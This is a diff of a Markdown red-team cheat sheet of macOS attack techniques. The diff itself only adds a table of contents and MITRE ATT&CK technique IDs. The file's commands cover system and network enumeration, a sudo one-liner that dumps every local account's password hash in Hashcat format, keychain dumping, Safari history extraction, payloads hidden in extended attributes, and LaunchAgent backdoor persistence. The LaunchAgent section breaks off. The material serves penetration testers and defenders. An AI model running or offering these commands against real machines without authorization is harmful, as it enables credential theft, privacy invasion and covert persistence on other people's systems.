@@ -1,8 +1,32 @@
 # Mac OSX TTPs
 
-## Enumeration
+## Table of Contents
 
-### Gathering System Information Using IOPlatformExpertDevice
+- [Enumeration](#enumeration) - T1082
+  - [Gathering System Information Using IOPlatformExpertDevice](#gathering-system-information-using-ioplatformexpertdevice) - T1082
+  - [Exploring Application Bundles](#exploring-application-bundles) - T1083
+  - [Basic System Enumeration](#basic-system-enumeration) - T1082
+  - [Users](#users) - T1087.001
+  - [Last Login](#last-login) - T1087
+  - [Passwords](#passwords) - T1003
+  - [Safari History](#safari-history) - T1217
+  - [Safari Settings](#safari-settings) - T1217
+  - [Keychains](#keychains) - T1555.001
+  - [Network Services](#network-services) - T1046
+  - [SMB Shares](#smb-shares) - T1135
+  - [AFP Shares](#afp-shares) - T1135
+  - [SSH Scanning](#ssh-scanning) - T1046
+  - [Network Service Scanning](#network-service-scanning) - T1046
+  - [System Profiler](#system-profiler) - T1082
+- [Persistence](#persistence) - T1543.001
+  - [Extended Attributes](#extended-attributes) - T1564.004
+  - [LaunchAgent Backdoors](#launchagent-backdoors) - T1543.001
+
+---
+
+## Enumeration (T1082)
+
+### Gathering System Information Using IOPlatformExpertDevice (T1082)
 
 The ioreg command allows interaction with the I/O Kit registry, and the -c flag specifies the class of devices to list. The IOPlatformExpertDevice class provides information about the platform expert, which includes various system attributes. The -d flag specifies the depth of the search within the device tree.
 
@@ -10,7 +34,7 @@ The ioreg command allows interaction with the I/O Kit registry, and the -c flag 
 ioreg -c IOPlatformExpertDevice -d 2
 ```
 
-### Exploring Application Bundles
+### Exploring Application Bundles (T1083)
 
 Applications on macOS are stored in the /Applications directory. Each application is bundled as a .app file, which is actually a directory with a specific layout. Key components of an application bundle include:
 
@@ -28,7 +52,7 @@ cd /Applications/Lens.app
 ls -R
 ```
 
-### Basic System Enumeration
+### Basic System Enumeration (T1082)
 
 Versions:
 
@@ -88,7 +112,7 @@ Wireless Network:
 ipconfig getsummary $(networksetup -listallhardwareports | awk '/Hardware Port: Wi-Fi/{getline; print $2}') | awk -F ' SSID : ' '/ SSID : / {print $2}'
 ```
 
-### Users
+### Users (T1087.001)
 
 The three types of MacOS users are:
 
@@ -111,7 +135,7 @@ dscl . read /Groups/[group]
 dsconfigad -show
 ```
 
-### Last Login
+### Last Login (T1087)
 
 This command reads the contents of the login window preferences plist file. This can potentially expose information such as:
 
@@ -148,7 +172,7 @@ Password:
 }
 ```
 
-### Passwords
+### Passwords (T1003)
 
 The following one-liner which will dump credentials of all non-service accounts in Hashcat format `-m 7100` (`macOS PBKDF2-SHA512`):
 
@@ -156,7 +180,7 @@ The following one-liner which will dump credentials of all non-service accounts 
 sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
 ```
 
-### Safari History
+### Safari History (T1217)
 
 Retrieve Safari history for user:
 
@@ -164,7 +188,7 @@ Retrieve Safari history for user:
 sqlite3 ~/Library/Safari/History.db "select datetime(history_visits.visit_time + 978307200, 'unixepoch') as last_visited, history_items.url from history_visits, history_items where history_visits.history_item=history_items.id order by last_visited;"
 ```
 
-### Safari Settings
+### Safari Settings (T1217)
 
 To view all the settings for Safari, run:
 
@@ -192,7 +216,7 @@ Output example:
 }
 ```
 
-### Keychains
+### Keychains (T1555.001)
 
 ```sh
 # List certificates
@@ -214,7 +238,7 @@ security dump-keychain -d
 > [!TIP]
 > The last command will prompt the user for their password each entry, even if root. This is **extremely** noisy
 
-### Network Services
+### Network Services (T1046)
 
 ```sh
 rmMgmt=$(netstat -na | grep LISTEN | grep tcp46 | grep "*.3283" | wc -l);
@@ -226,7 +250,7 @@ bmM=$(netstat -na | grep LISTEN | egrep 'tcp4|tcp6' | grep "*.4488" | wc -l);
 printf "\nThe following services are OFF if '0', or ON otherwise:\nScreen Sharing: %s\nFile Sharing: %s\nRemote Login: %s\nRemote Mgmt: %s\nRemote Apple Events: %s\nBack to My Mac: %s\n\n" "$scrShrng" "$flShrng" "$rLgn" "$rmMgmt" "$rAE" "$bmM";
 ```
 
-### SMB Shares
+### SMB Shares (T1135)
 
 ```sh
 # SMB share enumeration
@@ -235,7 +259,7 @@ sharing -l
 smbutil statshares -a
 ```
 
-### AFP Shares
+### AFP Shares (T1135)
 
 ```sh
 # AFP share enumeration
@@ -244,7 +268,7 @@ nmap -p 548 --script afp-showmount --script-args afp.username=yourusername,afp.p
 sudo sharing -l
 ```
 
-### SSH Scanning
+### SSH Scanning (T1046)
 
 Browse for all SSH services that are currently advertised on the local network
 
@@ -252,7 +276,7 @@ Browse for all SSH services that are currently advertised on the local network
 dns-sd -B _ssh._tcp
 ```
 
-### Network Service Scanning
+### Network Service Scanning (T1046)
 
 `dns-sd`: Uses Bonjour to discover network services like AFP, SMB, and more.
 
@@ -271,7 +295,7 @@ Timestamp     A/R    Flags  if Domain               Service Type         Instanc
 14:35:42.663  Add        2  16 .                    _tcp.local.          _googlezone
 ```
 
-### System Profiler
+### System Profiler (T1082)
 
 It is an application created to gather detailed information about the Mac on which it is running.
 
@@ -310,9 +334,9 @@ Hardware:
       Activation Lock Status: Disabled
 ```
 
-## Persistence
+## Persistence (T1543.001)
 
-### Extended Attributes
+### Extended Attributes (T1564.004)
 
 Extended attributes (EAs) on macOS can be used maliciously by attackers to hide data, evade detection, or persist malicious code, since EAs are not visible through typical file inspection methods
 
@@ -330,7 +354,7 @@ user.hiddenPayload
 I'm on your system
 ```
 
-### LaunchAgent Backdoors
+### LaunchAgent Backdoors (T1543.001)
 
 LaunchAgent plists are a common target because they provide persistent access that survives reboots. Take this Grammarly helper, for example:
 
